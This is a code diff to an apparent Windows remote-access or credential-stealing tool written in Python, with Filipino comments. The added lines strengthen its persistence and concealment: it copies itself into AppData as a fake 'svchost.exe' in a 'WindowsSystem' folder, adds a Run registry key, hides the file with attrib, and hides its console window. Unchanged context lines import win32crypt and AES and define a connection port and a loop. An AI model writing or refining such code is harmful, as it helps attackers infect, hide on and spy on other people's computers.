@@ -8,6 +8,8 @@ import sqlite3
 import base64
 import json
 import win32crypt
+import sys
+import winreg
 from Crypto.Cipher import AES
 
 PORT = 4443
@@ -56,10 +58,44 @@ def get_active_ip():
         return None
 
 def setup_persistence():
-    dest = os.path.join(os.getenv("APPDATA"), "svchost.exe")
-    if not os.path.exists(dest):
-        shutil.copy2(__file__, dest)
-        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f')
+    try:
+        # Kunin ang path ng current executable
+        if getattr(sys, 'frozen', False):
+            # Kung naka-bundle na EXE
+            current_file = sys.executable
+        else:
+            # Kung Python script
+            current_file = os.path.abspath(__file__)
+        
+        # Copy sa AppData folder
+        dest_dir = os.path.join(os.getenv("APPDATA"), "WindowsSystem")
+        if not os.path.exists(dest_dir):
+            os.makedirs(dest_dir)
+        
+        dest = os.path.join(dest_dir, "svchost.exe")
+        
+        # I-copy kung hindi pa naka-copy
+        if not os.path.exists(dest):
+            shutil.copy2(current_file, dest)
+            
+        # I-setup ang registry para sa persistence
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsSystem", 0, winreg.REG_SZ, dest)
+            winreg.CloseKey(key)
+        except Exception as e:
+            print(f"Registry error: {e}")
+            
+        # I-hide ang file
+        try:
+            subprocess.run(f'attrib +h "{dest}"', shell=True, capture_output=True)
+        except:
+            pass
+            
+    except Exception as e:
+        print(f"Persistence setup error: {e}")
 
 def connect():
     while True:
@@ -188,12 +224,23 @@ def handle_server(s):
         pass
 
 def main():
+    # I-setup ang persistence
     setup_persistence()
+    
+    # Mag-run sa background
+    if not getattr(sys, 'frozen', False):
+        # Kung script, i-hide ang console window
+        try:
+            import win32gui, win32con
+            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+        except:
+            pass
+    
+    # Main connection loop
     while True:
         try:
             sock = connect()
             handle_server(sock)
-            time.sleep(CHECK_INTERVAL)
         except Exception as e:
             time.sleep(CHECK_INTERVAL)
 
